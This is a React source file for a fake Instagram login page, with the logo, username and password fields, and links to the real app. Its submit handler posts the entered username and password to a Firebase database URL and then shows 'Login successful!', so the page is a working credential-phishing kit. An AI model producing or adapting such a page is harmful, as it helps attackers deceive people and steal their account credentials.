import React from 'react'
import {useState} from 'react'
import axios from 'axios'
import './App.css'
const App=()=>{
const [data,setdata]=useState({
  'username':'',
  'password':'',
});
const {username,password}=data
const submithandler=e1=>{
  e1.preventDefault();
  axios.post('https://instagram-efc22-default-rtdb.firebaseio.com/-O79hOFEL-TB1Nd2cgas.json',data).then(alert('Login successful!'));
}
const change=e=>{
  setdata({...data,[e.target.name]:e.target.value})
}
return(
<div id='div1'>
  <center>
  <br></br><br></br><br></br><br></br><br></br>
  <img src='insta.png' alt='error' height={100}/><br></br><br></br>
  <form onSubmit={submithandler}>
    <input type='text' name='username' value={username} onChange={change}  placeholder="Phone number,username or email"/><br></br><br></br>
    <input type='password' name='password' value={password} onChange={change} placeholder="Password" /><br></br>
    <p >----------OR-----------</p>
    <a href=" ">Log in Facebook</a><br></br><br></br>
    <p>Forgot password?</p>
    <input type='submit' value='Log in'/>
    <p>Don't have an account</p>
    <a href="https://apps.apple.com/us/app/instagram/id389801252?ct=igweb.loginPage.badge&mt=8&pt=428156&vt=lo">Sign Up</a><br></br>
    <p>Get the App</p>
    <img src="appstore.png" alt={'error'} height={30}></img>
  </form></center>
</div>
)
}
export default App;